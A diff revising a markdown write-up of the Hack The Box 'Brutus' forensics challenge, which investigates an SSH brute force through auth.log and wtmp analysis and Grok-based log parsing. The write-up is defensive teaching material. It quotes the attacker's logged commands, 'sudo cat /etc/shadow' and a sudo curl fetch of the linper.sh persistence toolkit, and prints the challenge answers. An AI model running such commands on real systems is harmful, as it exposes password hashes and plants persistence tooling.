@@ -1,23 +1,33 @@
----
-title: "Brutus"
-description: "HTB Sherlock Brutus investigation writeup (auth.log and wtmp DFIR)."
----
+# Brutus - HTB Sherlock Writeup (DFIR / Log Analysis)
+
+## Challenge Description
+
+> A Confluence server was brute-forced via its SSH service. After gaining access, the attacker
+> performed additional activities including privilege escalation, persistence (creating a new user),
+> and downloading tools.
 
 **Difficulty:** Very Easy  
-**Author:** Cyberjunkie  
-**Focus:** Unix auth.log analysis, wtmp analysis, brute-force investigation, post-exploitation tracking
-
-## Scenario
-
-A Confluence server was brute-forced via its SSH service. After gaining access, the attacker performed additional activities including privilege escalation, persistence (creating a new user), and downloading tools. We investigate using `auth.log` and `wtmp` artifacts.
+**Category:** DFIR / Log Analysis  
+**Evidence Files:** `auth.log`, `wtmp`
 
 ---
 
-## Understanding the Artifacts
+## Initial Analysis Methodology
 
-### auth.log Fields
+Before diving into the challenge questions, the goal is to understand what happened using only the
+evidence. This section walks through a repeatable approach you can apply to any unknown log set -
+the same steps, in the same order, every time.
 
-Each line in auth.log follows this format:
+We have two artifacts from a Linux server. We don't know yet who attacked it, how they got in, or
+what they did after. The methodology below will answer all three.
+
+---
+
+### Step 1 - Understand the Artifacts: What are we working with?
+
+Before running any commands, it helps to know what each file actually is.
+
+**auth.log** is a structured plaintext log. Every line follows this format:
 
 ```text
 <Date/Time> <Hostname> <Service>[<PID>]: <Message>
@@ -29,20 +39,16 @@ Example:
 Mar 10 10:23:45 exampleserver sshd[19360]: Failed password for invalid user admin from 192.168.1.101 port 22 ssh2
 ```
 
-Key services you'll encounter: `sshd`, `sudo`, `useradd`, `usermod`, `groupadd`, `passwd`, `chfn`, `systemd-logind`, `CRON`.
+Key services you'll encounter: `sshd`, `sudo`, `useradd`, `usermod`, `groupadd`, `passwd`, `chfn`,
+`systemd-logind`, `CRON`.
 
-### wtmp
-
-This is a binary file - you cannot `cat` it. Use these tools:
+**wtmp** is a binary file. You cannot `cat` it. Use these tools:
 
 ```bash
-# Basic login history (use -f to specify a file other than /var/log/wtmp)
-last -f wtmp
-
-# Force UTC timestamps (critical for incident timelines!)
+# Basic login history
 TZ=UTC last -f wtmp
 
-# Full timestamps including logout
+# Full timestamps including logout time
 TZ=UTC last -dF -f wtmp
 
 # Alternative: raw dump
@@ -52,43 +58,123 @@ utmpdump wtmp
 TZ=UTC who -a wtmp
 ```
 
-**Important timezone note:** wtmp timestamps are displayed using your local system timezone, not the timezone of the source system. Always prefix commands with `TZ=UTC` when doing forensic analysis to keep your timeline consistent across artifacts.
+**Important timezone note:** wtmp timestamps are displayed using your local system timezone, not the
+timezone of the source system. Always prefix commands with `TZ=UTC` when doing forensic analysis to
+keep your timeline consistent across artifacts.
 
-> **Tip from IppSec:** If `last -f wtmp` gives a SQLite error on newer Kali versions, this is because newer systemd versions use a database format. The file you're analyzing is the older binary format. Use `utmpdump` or `who -a` as alternatives, or use the `utmp.py` script provided by HTB.
+> **Note:** If `last -f wtmp` gives a SQLite error on newer Kali versions, this is because newer
+> systemd versions use a database format. The file you're analyzing is the older binary format. Use
+> `utmpdump` or `who -a` as alternatives.
 
 ---
 
-## Initial Exploration (Before Answering Questions)
+### Step 2 - Survey the Log: What services are recorded?
 
-Before jumping into questions, IppSec recommends doing initial reconnaissance on the log data.
-
-### Step 1: Identify all programs in auth.log
-
-This gives you an overview of what types of events are recorded:
+Before looking for anything specific, get a picture of what types of events are present. This
+prevents tunnel vision and surfaces activity you might not have expected.
 
 ```bash
-awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c | sort -n > log_programs.txt
+awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c | sort -n
 ```
 
-**How this works:**
+**How this works:** `awk '{print $5}'` extracts the service name and PID field (e.g.,
+`sshd[1234]:`), then `sed` strips the brackets and PID leaving just the service name, and
+`sort | uniq -c | sort -n` counts occurrences sorted numerically.
 
-- `awk '{print $5}'` - Extracts the 5th field (program name + PID, e.g., `sshd[1234]:`)
-- `sed 's/[\[\:].*//g'` - Strips everything from the first `[` or `:` onward, leaving just the program name
-- `sort | uniq -c | sort -n` - Counts occurrences and sorts numerically
+You'll see services like `sshd`, `sudo`, `CRON`, `useradd`, `usermod`, `groupadd`, `passwd`,
+`chfn`, `systemd-logind`. The presence of `useradd` and `usermod` immediately tells you that user
+account manipulation happened during this time window, worth investigating once we understand the
+entry point.
 
-You'll see programs like: `sshd`, `sudo`, `CRON`, `useradd`, `usermod`, `groupadd`, `passwd`, `chfn`, `systemd-logind`
+---
 
-### Step 2: Quick look at wtmp
+### Step 3 - Check Login Sessions: Who logged in and from where?
+
+With a picture of what services are present, the next step is to get a high-level view of login
+sessions. wtmp gives this to us instantly:
 
 ```bash
 TZ=UTC last -f wtmp
 ```
 
-This immediately shows you login sessions, source IPs, and session durations - giving you a high-level picture before diving into details.
+This shows login sessions, source IPs, and session durations, giving you a high-level picture before reading
+individual log lines. Look for sessions from unexpected IPs, sessions that lasted an unusually short
+time (automated tooling), or sessions that lasted an unusually long time (interactive attacker
+activity).
 
-### Step 3: Verify timezone alignment
+---
 
-Compare timestamps between auth.log and wtmp for the same event. If a login shows at the same time in both, the auth.log is already in UTC.
+### Step 4 - Identify the Attack: Look for brute-force patterns
+
+Now look at authentication events in auth.log. The key signal for a brute-force is a high volume
+of failed authentication attempts from a single IP in a short time window.
+
+```bash
+grep -oP ' \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' auth.log | sort | uniq -c | sort -n
+```
+
+One IP will stand out immediately with an order-of-magnitude more attempts than any other. A useful
+rule of thumb: _"Could a human attempt to authenticate this often manually?"_ If the answer is
+no, it's automated tooling.
+
+To read the actual failed attempts:
+
+```bash
+grep sshd auth.log | grep -v pam_unix | less
+```
+
+---
+
+### Step 5 - Trace Post-Exploitation: What did the attacker do after getting in?
+
+Once you have identified the attacker's IP and the compromised account, trace the events that
+follow. In auth.log, `sudo`, `useradd`, `usermod`, and `passwd` entries after a successful login
+from the attacker's IP are all post-exploitation activity.
+
+```bash
+grep "Accepted" auth.log | grep "<attacker_ip>"
+grep "useradd\|usermod\|sudo" auth.log
+```
+
+Cross-reference timestamps from auth.log with wtmp sessions to confirm which session each action
+belongs to.
+
+---
+
+### Methodology Summary
+
+Every time you approach an unknown log set, follow this sequence:
+
+1. **Understand the artifacts**: know what each file is, its format, and its limitations before
+   running any commands
+2. **Survey the log**: identify which services appear to get a complete picture of recorded
+   activity before focusing on anything specific
+3. **Check login sessions**: use wtmp for a high-level view of who logged in, from where, and for
+   how long
+4. **Identify the attack**: look for statistical anomalies like IP addresses with disproportionate
+   failed login counts
+5. **Trace post-exploitation**: follow the attacker's session chronologically through
+   `useradd`, `sudo`, `usermod`, and other privilege or persistence events
+6. **Cross-reference timestamps**: align auth.log and wtmp events to build a unified timeline and
+   confirm which actions belong to which session
+
+---
+
+## Attack Timeline
+
+| Time (UTC) | Event                                                         | Source   |
+| ---------- | ------------------------------------------------------------- | -------- |
+| `06:31:31` | Brute force begins from `65.2.161.68`                         | auth.log |
+| `06:31:40` | First successful root login (automated, immediate disconnect) | auth.log |
+| `06:32:44` | Second successful root login (manual, session persists)       | auth.log |
+| `06:32:45` | Interactive terminal session established                      | wtmp     |
+| `06:34:18` | New user `cyberjunkie` created (UID 1002)                     | auth.log |
+| `06:34:26` | Password set for `cyberjunkie`                                | auth.log |
+| `06:35:15` | `cyberjunkie` added to sudo group                             | auth.log |
+| `06:37:24` | Root session 37 closed                                        | auth.log |
+| `06:37:34` | `cyberjunkie` logs in                                         | auth.log |
+| `06:37:57` | `cyberjunkie` runs `sudo cat /etc/shadow`                     | auth.log |
+| `06:39:38` | `cyberjunkie` downloads `linper.sh` via sudo curl             | auth.log |
 
 ---
 
@@ -96,83 +182,89 @@ Compare timestamps between auth.log and wtmp for the same event. If a login show
 
 ### Q1: What is the IP address used by the attacker to carry out a brute force attack?
 
-**Method:** Look for repeated "Failed password" and "Invalid user" entries from a single IP in rapid succession.
+**Artifacts:** `auth.log`  
+**Method:** Look for repeated "Failed password" and "Invalid user" entries from a single IP in rapid
+succession.
 
 ```bash
-# Extract all IPs from auth.log, count occurrences
 grep -oP ' \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' auth.log | sort | uniq -c | sort -n
 ```
 
-The IP with 165 connection attempts in rapid succession (all within seconds of each other) stands out immediately. A useful rule of thumb from the writeup: _"Could a human attempt to authenticate this often manually?"_ - if the answer is no, investigate further.
-
-You can also filter sshd lines and exclude noise:
+The IP with 165 connection attempts in rapid succession (all within seconds of each other) stands
+out immediately. You can also filter sshd lines and exclude noise:
 
 ```bash
 grep sshd auth.log | grep -v pam_unix | less
 ```
 
-**Answer:** `65.2.161.68`
+> **Answer:** `65.2.161.68`
 
 ---
 
 ### Q2: The brute force was successful. What is the username of the compromised account?
 
+**Artifacts:** `auth.log`  
 **Method:** Search for successful logins from the attacker's IP.
 
 ```bash
 grep "Accepted" auth.log | grep "65.2.161.68"
 ```
 
-The first "Accepted password" from this IP is for the `root` account. Notice that the session closes in the same second - this is the brute-force tool confirming the credentials, not a manual login. When you see an accepted password followed by an immediate disconnect, that's a strong indicator of automated tooling (e.g., Hydra, Medusa, Brutus).
+The first "Accepted password" from this IP is for the `root` account. Notice that the session
+closes in the same second; this is the brute-force tool confirming the credentials, not a manual
+login. When you see an accepted password followed by an immediate disconnect, that's a strong
+indicator of automated tooling (e.g., Hydra, Medusa).
 
-**Answer:** `root`
+> **Answer:** `root`
 
 ---
 
 ### Q3: Identify the UTC timestamp when the attacker manually logged in (from wtmp).
 
-**Method:** The question specifically asks for the wtmp timestamp, not auth.log.
-
-There's an important distinction here:
+**Artifacts:** `wtmp`  
+**Method:** The question specifically asks for the wtmp timestamp, not auth.log. There is an
+important distinction:
 
 - **auth.log** records when the password was _accepted_ (authentication event)
 - **wtmp** records when the interactive _terminal session_ was created (login event)
 
-These can differ by a second or more. The attacker authenticated at 06:32:44 in auth.log, but the terminal session was established at 06:32:45 in wtmp.
+These can differ by a second or more. The attacker authenticated at `06:32:44` in auth.log, but the
+terminal session was established at `06:32:45` in wtmp.
 
 ```bash
 TZ=UTC last -f wtmp
-# Or using utmp.py:
-# python3 utmp.py -o wtmp.out wtmp
-# cat wtmp.out | grep 65.2.161.68
 ```
 
-The second login from 65.2.161.68 (where the session lasts several minutes, unlike the instant brute-force disconnect) is the manual login.
+The second login from `65.2.161.68` (where the session lasts several minutes, unlike the instant
+brute-force disconnect) is the manual login.
 
-**Answer:** `2024-03-06 06:32:45`
+> **Answer:** `2024-03-06 06:32:45`
 
 ---
 
 ### Q4: What is the attacker's SSH session number?
 
-**Method:** Session numbers are assigned by `systemd-logind`. Look at the log line immediately after the session is opened.
+**Artifacts:** `auth.log`  
+**Method:** Session numbers are assigned by `systemd-logind`. Look at the log line immediately after
+the session is opened.
 
 ```bash
 grep "systemd-logind" auth.log
 ```
 
-Find the "New session" entry that corresponds to the attacker's manual login time (06:32:44/45):
+Find the "New session" entry that corresponds to the attacker's manual login time (`06:32:44/45`):
 
 ```text
 Mar  6 06:32:44 ... systemd-logind[411]: New session 37 of user root.
 ```
 
-**Answer:** `37`
+> **Answer:** `37`
 
 ---
 
 ### Q5: What new user account did the attacker create for persistence?
 
+**Artifacts:** `auth.log`  
 **Method:** Search for user creation events.
 
 ```bash
@@ -185,13 +277,17 @@ This shows a new user `cyberjunkie` was created. Then check for privilege escala
 grep "usermod" auth.log
 ```
 
-The attacker added `cyberjunkie` to the `sudo` group, granting full administrative privileges. This is a classic persistence technique - create a new account with elevated privileges so you can return later without needing to brute-force again.
+The attacker added `cyberjunkie` to the `sudo` group, granting full administrative privileges. This
+is a classic persistence technique: create a new account with elevated privileges so you can return
+later without needing to brute-force again.
 
-**Answer:** `cyberjunkie`
+> **Answer:** `cyberjunkie`
 
 ---
 
 ### Q6: What is the MITRE ATT&CK sub-technique ID for persistence via new account creation?
+
+**Artifacts:** N/A (MITRE ATT&CK reference)
 
 The MITRE ATT&CK framework categorizes this under:
 
@@ -199,14 +295,16 @@ The MITRE ATT&CK framework categorizes this under:
 - **Technique:** Create Account (T1136)
 - **Sub-technique:** Local Account (T1136.001)
 
-Other sub-techniques include Domain Account (.002) and Cloud Account (.003), but since this was a local Linux account, it's .001.
+Other sub-techniques include Domain Account (.002) and Cloud Account (.003), but since this was a
+local Linux account, it's `.001`.
 
-**Answer:** `T1136.001`
+> **Answer:** `T1136.001`
 
 ---
 
 ### Q7: What time did the attacker's first SSH session end?
 
+**Artifacts:** `auth.log`  
 **Method:** Look for when session 37 was closed.
 
 ```bash
@@ -220,86 +318,70 @@ Mar  6 06:37:24 ... systemd-logind[411]: Session 37 logged out. Waiting for proc
 Mar  6 06:37:24 ... systemd-logind[411]: Removed session 37.
 ```
 
-**Answer:** `2024-03-06 06:37:24`
+> **Answer:** `2024-03-06 06:37:24`
 
 ---
 
 ### Q8: What full command did the attacker execute using sudo from their backdoor account?
 
-**Method:** Although auth.log doesn't normally track commands, `sudo` commands are logged because they require authentication.
+**Artifacts:** `auth.log`  
+**Method:** Although auth.log doesn't normally track commands, `sudo` commands are logged because
+they require privilege elevation.
 
 ```bash
 grep "sudo:" auth.log | grep "cyberjunkie"
 ```
 
-Two sudo commands are visible:
-
-1. `cat /etc/shadow` - The attacker dumped password hashes
-2. `curl` to download a persistence toolkit
-
-The full command for the download:
+Two sudo commands are visible. First, `cat /etc/shadow` to dump password hashes.
+Second, a `curl` download of a persistence toolkit. The full command:
 
 ```text
 COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
 
-The script `linper.sh` is a Linux persistence toolkit - a bash script that automates various persistence techniques.
+`linper.sh` is a Linux persistence toolkit, a bash script that automates various persistence
+techniques on compromised hosts.
 
-**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
+> **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 
 ---
 
 ## Beyond Root: Parsing auth.log with Grok
 
-This section covers the advanced approach demonstrated by IppSec, where instead of doing ad-hoc grep/awk/sed commands, you parse the entire log into structured JSON using Grok patterns. This is how SIEMs like Elastic and Splunk process unstructured logs at scale.
+This section covers parsing the entire log into structured JSON using Grok patterns, the same
+approach used by SIEMs like Elastic and Splunk to process unstructured logs at scale.
 
 ### Why Grok?
 
-The problem with auth.log is that it's unstructured. Different log messages have different formats - a "Failed password for invalid user" line has extra words compared to a "Failed password for" line (where the user exists on the system). This makes `awk` field positions inconsistent:
+The problem with auth.log is that it's unstructured. Different log messages have different formats,
+making `awk` field positions inconsistent:
 
 ```text
 Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2    # username is field 11
 Failed password for backup from 65.2.161.68 port 46512 ssh2                # username is field 9
 ```
 
-Grok solves this by using named pattern matching (like simplified regex) to extract fields regardless of position.
-
-### What is Grok?
-
-Grok is a pattern matching syntax originally created for Logstash (part of the Elastic Stack). It provides pre-built patterns for common data types like IP addresses, numbers, words, and paths. The syntax looks like:
+Grok solves this by using named pattern matching to extract fields regardless of position. The
+syntax looks like:
 
 ```text
 %{PATTERN_NAME:field_name}
 ```
 
-For example:
+For example: `%{IP:source_ip}` matches an IP address into a field called `source_ip`, and
+`%{WORD:username}` matches a single word into `username`.
 
-- `%{IP:source_ip}` - Matches an IP address and assigns it to a field called `source_ip`
-- `%{WORD:username}` - Matches a single word and calls it `username`
-- `%{BASE10NUM:pid}` - Matches a number and calls it `pid`
-- `%{DATA:message}` - Matches any data (non-greedy)
-- `%{GREEDYDATA:message}` - Matches everything remaining
+### Tools
 
-### Tools Used
+**Grok Debugger** (https://grokdebugger.com/): paste a log line, write your pattern, and see
+matched fields in real-time. Always iterate here before writing any code.
 
-#### Grok Debugger (https://grokdebugger.com/)
+**go-grok** (https://github.com/elastic/go-grok): a Go library by Elastic for parsing text with
+Grok patterns, with built-in pattern definitions matching what Logstash uses.
 
-An online tool similar to regex101 but for Grok patterns. You paste a log line, write your Grok pattern, and it shows you the matched fields in real-time. This is invaluable for iterating on patterns before writing code.
+### Building the Parser
 
-Key features:
-
-- Live match highlighting
-- Autocomplete for pattern names
-- Built-in pattern reference (WORD, IP, DATA, BASE10NUM, SYSLOGBASE2, etc.)
-- Shows all captured fields
-
-#### go-grok (https://github.com/elastic/go-grok)
-
-A Go library by Elastic for parsing text with Grok patterns. IppSec chose this over Python alternatives (like `pygrok`) because it's from Elastic themselves and comes with built-in pattern definitions matching what Elastic/Logstash uses.
-
-### Building the Grok Parser
-
-#### Step 1: Initialize the Go project
+Initialize the Go project:
 
 ```bash
 mkdir go-brutus && cd go-brutus
@@ -308,119 +390,32 @@ go get github.com/elastic/go-grok
 touch main.go
 ```
 
-#### Step 2: Start with the log prefix
-
-Every auth.log line starts the same way: timestamp, hostname, program[PID]. The built-in `SYSLOGBASE2` pattern handles most of this:
+Every auth.log line starts with timestamp, hostname, and program. The built-in `SYSLOGBASE2`
+pattern handles most of this; note that `WORD` won't work for the program field because some
+programs contain dashes (e.g., `systemd-logind`), so use `DATA` instead:
 
 ```text
 %{SYSLOGBASE2} %{DATA:program}\[%{BASE10NUM:pid}\]:
 ```
 
-Test this in the Grok Debugger first. Note that `WORD` won't work for the program field because some programs contain dashes (e.g., `systemd-logind`), so use `DATA` instead.
-
-#### Step 3: Create patterns for each log message type
-
-**SSH auth pattern (handles both "invalid user" and valid user lines):**
+Patterns for each log message type:
 
 ```text
-%{LOG_PREFIX} %{WORD:result} %{WORD:login_type} for (invalid user )?%{DATA:username} from %{IP:source_ip} port %{BASE10NUM:client_port} %{WORD:protocol}
+# SSH auth — (invalid user )? makes the phrase optional, matching both valid and invalid user lines
+SSH_AUTH: %{LOG_PREFIX} %{WORD:result} %{WORD:login_type} for (invalid user )?%{DATA:username} from %{IP:source_ip} port %{BASE10NUM:client_port} %{WORD:protocol}
+
+# systemd-logind sessions — trailing period anchors the optional "of user" clause
+SYSTEMD_SESSION: %{LOG_PREFIX} %{WORD:status} session %{BASE10NUM:session_id}( of user %{USERNAME:username})?.
+
+# useradd
+USER_ADD: %{LOG_PREFIX} new user: name=%{USERNAME:username}, UID=%{BASE10NUM:uid}, GID=%{BASE10NUM:gid}, home=%{UNIXPATH:home_dir}, shell=%{UNIXPATH:shell}, from=%{UNIXPATH:from}
+
+# sudo
+SUDO_CMD: %{LOG_PREFIX} %{USERNAME:user} : TTY=%{WORD:tty} ; PWD=%{UNIXPATH:pwd} ; USER=%{USERNAME:tgt_user} ; COMMAND=%{GREEDYDATA:command}
 ```
 
-The `(invalid user )?` makes "invalid user" optional, so the same pattern matches both:
-
-- `Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2`
-- `Failed password for backup from 65.2.161.68 port 46512 ssh2`
-
-**systemd-logind session pattern:**
-
-```text
-%{LOG_PREFIX} %{WORD:status} session %{BASE10NUM:session_id}( of user %{USERNAME:username})?\.
-```
-
-The conditional `( of user ...)?` handles both "New session 37 of user root." and "Removed session 37." - the trailing period is matched literally, which is important because Grok's optional operator needs a character after the closing parenthesis.
-
-**useradd pattern:**
-
-```text
-%{LOG_PREFIX} new user: name=%{USERNAME:username}, UID=%{BASE10NUM:uid}, GID=%{BASE10NUM:gid}, home=%{UNIXPATH:home_dir}, shell=%{UNIXPATH:shell}, from=%{UNIXPATH:from}
-```
-
-**sudo pattern:**
-
-```text
-%{LOG_PREFIX} %{USERNAME:user} : TTY=%{WORD:tty} ; PWD=%{UNIXPATH:pwd} ; USER=%{USERNAME:tgt_user} ; COMMAND=%{GREEDYDATA:command}
-```
-
-#### Step 4: The Go program structure
-
-The program reads auth.log line by line, tries each Grok pattern, and outputs matched lines as JSON:
-
-```go
-package main
-
-import (
-    "bufio"
-    "encoding/json"
-    "fmt"
-    "log"
-    "os"
-    "strings"
-
-    grok "github.com/elastic/go-grok"
-)
-
-func main() {
-    g := grok.New()
-
-    // Base patterns
-    basePatterns := map[string]string{
-        "LOG_PREFIX": "%{SYSLOGBASE2} %{DATA:program}\\[%{BASE10NUM:pid}\\]:",
-    }
-
-    // Log entry patterns
-    logEntries := map[string]string{
-        "SSH_AUTH": `%{LOG_PREFIX} %{WORD:result} %{WORD:login_type} for (invalid user )?%{DATA:username} from %{IP:source_ip} port %{BASE10NUM:client_port} %{WORD:protocol}`,
-        "SYSTEMD_SESSION": `%{LOG_PREFIX} %{WORD:status} session %{BASE10NUM:session_id}( of user %{USERNAME:username})?\\.`,
-        "USER_ADD": `%{LOG_PREFIX} new user: name=%{USERNAME:username}, UID=%{BASE10NUM:uid}, GID=%{BASE10NUM:gid}, home=%{UNIXPATH:home_dir}, shell=%{UNIXPATH:shell}, from=%{UNIXPATH:from}`,
-        "SUDO_CMD": `%{LOG_PREFIX} %{USERNAME:user} : TTY=%{WORD:tty} ; PWD=%{UNIXPATH:pwd} ; USER=%{USERNAME:tgt_user} ; COMMAND=%{GREEDYDATA:command}`,
-    }
-
-    // Add built-in syslog patterns
-    g.AddPatterns(grok.PatternsLinuxSyslog)
-    g.AddPatterns(basePatterns)
-    g.AddPatterns(logEntries)
-
-    // Build combined pattern with OR
-    var patternNames []string
-    for key := range logEntries {
-        patternNames = append(patternNames, "%{"+key+"}")
-    }
-    combined := strings.Join(patternNames, "|")
-
-    g.Compile(combined)
-
-    // Read and parse auth.log
-    file, err := os.Open("auth.log")
-    if err != nil {
-        log.Fatal(err)
-    }
-    defer file.Close()
-
-    scanner := bufio.NewScanner(file)
-    for scanner.Scan() {
-        line := scanner.Text()
-        result, err := g.ParseString(line)
-        if err == nil {
-            jsonData, _ := json.Marshal(result)
-            fmt.Println(string(jsonData))
-        }
-    }
-}
-```
-
-#### Step 5: Query with jq
-
-Once the program outputs JSON, you can pipe it through `jq` for powerful queries:
+The full Go program reads auth.log line by line, tries each pattern, and outputs matched lines as
+JSON. Once running, pipe through `jq` for flexible queries:
 
 ```bash
 # Find all failed SSH attempts from attacker IP
@@ -429,57 +424,35 @@ go run main.go | grep "65.2.161.68" | jq '.'
 # Show only successful logins
 go run main.go | grep "Accepted" | jq '{source_ip, username, result}'
 
-# Find new sessions (session IDs)
+# Find new sessions
 go run main.go | grep "session" | grep -v "CRON" | grep "New" | jq '.'
 
 # Show sudo commands by cyberjunkie
-go run main.go | grep -i "sudo" | jq '{user, tgt_user, command}'
-
-# See what user cyberjunkie ran as root
 go run main.go | grep "cyberjunkie" | jq '.user + " ran as " + .tgt_user + " with command: " + .command'
 ```
 
 ### Why This Matters for Defenders
 
-As IppSec explains, this Grok-based approach is how logs are processed at scale in real SOC environments:
+This Grok-based approach is how logs are processed at scale in real SOC environments:
 
 1. **Raw logs** come in from servers (auth.log, syslog, application logs)
 2. **Grok rules** parse them into structured fields
 3. **Logstash/Fluentd** ingests the structured data into **Elasticsearch** or **Splunk**
 4. **Analysts** query using KQL, Lucene, or SPL instead of grep/awk
 
-Many applications don't log in structured JSON format, so you'll frequently find yourself writing Grok patterns to parse custom log formats. Learning this skill is essential for anyone working in defensive security, SOC analysis, or SIEM administration.
-
-The Grok Debugger at https://grokdebugger.com/ is your best friend when building these patterns - iterate there before writing any code.
-
----
-
-## Attack Timeline Summary
-
-| Time (UTC) | Event                                                               | Source   |
-| ---------- | ------------------------------------------------------------------- | -------- |
-| 06:31:31   | Brute force begins from 65.2.161.68                                 | auth.log |
-| 06:31:40   | First successful root login (automated - immediate disconnect)      | auth.log |
-| 06:32:44   | Second successful root login (manual - session persists)            | auth.log |
-| 06:32:45   | Interactive terminal session established                            | wtmp     |
-| 06:34:18   | New user `cyberjunkie` created (UID 1002)                           | auth.log |
-| 06:34:26   | Password set for `cyberjunkie`                                      | auth.log |
-| 06:35:15   | `cyberjunkie` added to sudo group                                   | auth.log |
-| 06:37:24   | Root session 37 closed                                              | auth.log |
-| 06:37:34   | `cyberjunkie` logs in                                               | auth.log |
-| 06:37:57   | `cyberjunkie` runs `sudo cat /etc/shadow`                           | auth.log |
-| 06:39:38   | `cyberjunkie` downloads linper.sh persistence toolkit via sudo curl | auth.log |
+Learning to write Grok patterns is essential for anyone working in defensive security, SOC analysis,
+or SIEM administration.
 
 ---
 
 ## Skills Learned
 
-- Unix log analysis (auth.log and wtmp)
+- Unix log analysis (`auth.log` and `wtmp`)
 - Brute-force detection patterns in SSH logs
-- Distinguishing automated vs manual logins
+- Distinguishing automated vs manual logins from session duration
 - Tracking privilege escalation and persistence in auth.log
 - Timeline creation across multiple artifacts
 - MITRE ATT&CK framework mapping
 - Grok pattern creation for structured log parsing
 - Using go-grok (Elastic) for programmatic log analysis
-- Piping JSON output through jq for flexible querying
+- Piping JSON output through `jq` for flexible querying
